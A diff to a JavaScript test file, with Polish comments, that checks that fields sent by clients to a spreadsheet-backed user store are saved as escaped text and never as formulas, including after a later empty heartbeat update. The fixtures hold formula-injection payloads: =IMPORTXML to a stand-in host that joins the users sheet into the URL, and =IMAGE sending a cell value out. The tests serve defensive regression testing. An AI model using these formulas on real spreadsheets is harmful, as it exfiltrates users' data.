@@ -24,6 +24,13 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
   ok('żadne pole od klienta nie trafia do arkusza jako formuła (puls, sesja, reset, zmiana hasła, logowanie, dziennik)', B.formuly().length === 0, JSON.stringify(B.formuly()));
   const s = B.get('Uzytkownicy').w[1];
   ok('tekst z formułą zostaje w arkuszu jako zwykły tekst (z apostrofem), a nie znika', String(s[6]).startsWith("'") || s[6] === '', String(s[6]).slice(0, 30));
+  // arkusz oddaje tekst „'=…” bez apostrofu: puls z pustym polem nie może zapisać tej wartości z powrotem (stałaby się formułą)
+  const C = swiezy();
+  C.post({ akcja: 'puls', kod: '12345', system: '=IMAGE("http://x.yz/"&N2)', wersja: '=1+1' }, { haslo: 'haslo123' });
+  C.post({ akcja: 'puls', kod: '12345', system: '', wersja: '' }, { haslo: 'haslo123' });
+  ok('drugi puls z pustym „system” i „wersja” nie zamienia zapisanego tekstu w formułę', C.formuly().length === 0 && /^'=IMAGE/.test(C.get('Uzytkownicy').w[1][6]) && C.get('Uzytkownicy').w[1][5] === "'=1+1", JSON.stringify(C.formuly()));
+  C.post({ akcja: 'puls', kod: '12345', system: 'Web' }, { haslo: 'haslo123' }); C.post({ akcja: 'puls', kod: '12345', system: '' }, { haslo: 'haslo123' });
+  ok('puls z pustym polem zostawia dotychczasową zwykłą wartość', C.get('Uzytkownicy').w[1][6] === 'Web');
 }
 /* ---- 2. puls i konta ---- */
 {
